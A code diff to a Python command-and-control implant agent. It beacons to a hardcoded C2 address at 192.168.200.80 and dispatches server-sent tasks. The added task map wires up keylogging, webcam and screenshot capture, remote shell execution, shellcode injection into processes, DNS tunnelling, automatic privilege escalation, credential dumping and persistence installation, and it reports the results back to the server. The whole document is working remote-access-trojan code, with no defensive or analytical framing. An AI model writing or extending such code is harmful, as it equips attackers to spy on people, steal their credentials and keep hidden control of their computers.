@@ -8,10 +8,21 @@ import requests
 import threading
 import importlib
 from datetime import datetime
+
+# Import all required module functions
 from modules.system_info import get_system_info
+from modules.process import list_processes
+from modules.surveillance import take_screenshot, capture_webcam, start_keylogger, stop_keylogger, is_keylogger_running
+from modules.shell import execute_command
+from modules.files import list_directory
+from modules.shellcode import inject_shellcode
+from modules.dns_tunnel import start_dns_tunnel
+from modules.privesc import attempt_privilege_escalation
+from modules.credential_dump import dump_credentials
+from modules.persistence import install_persistence
 
 # === Configuration ===
-C2_URL = "http://172.18.181.223:5001/"
+C2_URL = "http://192.168.200.80:5001"
 BEACON_INTERVAL = 10
 agent_id = f"agent_{uuid.uuid4()}"
 # ======================
@@ -80,49 +91,52 @@ def send_result(task_id, result):
         logging.error("Result send error: " + str(e))
 
 def run_task(task):
-    task_id = task.get("id")
-    task_type = task.get("type")
+    """Execute a task and send back the result"""
+    task_id = task.get('task_id')
+    task_type = task.get('type')
+    task_data = task.get('data', {})
     result = None
 
     try:
-        if task_type == "system_info":
-            result = get_system_info()
+        logging.info(f"Executing task {task_id} of type {task_type}")
+        
+        # Map task types to functions
+        task_handlers = {
+            'system.get_info': get_system_info,
+            'process.list': list_processes,
+            'surveillance.screenshot': take_screenshot,
+            'surveillance.webcam': capture_webcam,
+            'surveillance.keylogger': lambda: start_keylogger() if not is_keylogger_running() else stop_keylogger(),
+            'shell.execute': lambda: execute_command(task_data.get('command')) if task_data.get('command') else "No command provided",
+            'files.browser': lambda: list_directory(task_data.get('path', '.')),
+            'shellcode.inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
+            'dns_tunnel.start': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
+            'privesc.auto': attempt_privilege_escalation,
+            'credentials.dump': dump_credentials,
+            'persistence.install': lambda: install_persistence(task_data.get('method', 'registry'))
+        }
+
+        # Execute the task
+        if task_type in task_handlers:
+            result = task_handlers[task_type]()
         else:
-            try:
-                # Dynamically load module
-                module_path = f"modules.{task_type}"
-                mod = importlib.import_module(module_path)
+            result = f"Unknown task type: {task_type}"
 
-                # Case 1: Simple run() function
-                if hasattr(mod, "run") and callable(mod.run):
-                    result = mod.run()
-
-                else:
-                    # Case 2: Class with run()/capture_image()/start() methods
-                    class_name = ''.join([part.capitalize() for part in task_type.split('_')])
-                    handler_cls = getattr(mod, class_name, None)
-
-                    if handler_cls:
-                        instance = handler_cls()
-                        if hasattr(instance, "run") and callable(instance.run):
-                            result = instance.run()
-                        elif hasattr(instance, "capture_image") and callable(instance.capture_image):
-                            result = instance.capture_image()
-                        elif hasattr(instance, "start") and callable(instance.start):
-                            instance.start()
-                            result = f"{task_type} started."
-                        else:
-                            result = f"{task_type} module loaded, but no recognized method found."
-                    else:
-                        result = f"No matching class '{class_name}' found in {task_type}.py"
-
-            except Exception as e:
-                result = f"[Error loading module]: {str(e)}"
-
-        send_result(task_id, result)
+        # Send the result back
+        send_result(task_id, {
+            'status': 'success',
+            'data': result,
+            'timestamp': datetime.now().isoformat()
+        })
 
     except Exception as e:
-        send_result(task_id, f"[Task execution failed]: {str(e)}")
+        error_msg = f"Task execution failed: {str(e)}"
+        logging.error(error_msg)
+        send_result(task_id, {
+            'status': 'error',
+            'error': error_msg,
+            'timestamp': datetime.now().isoformat()
+        })
 
 def auto_task_post_startup():
     logging.info("Running startup modules...")
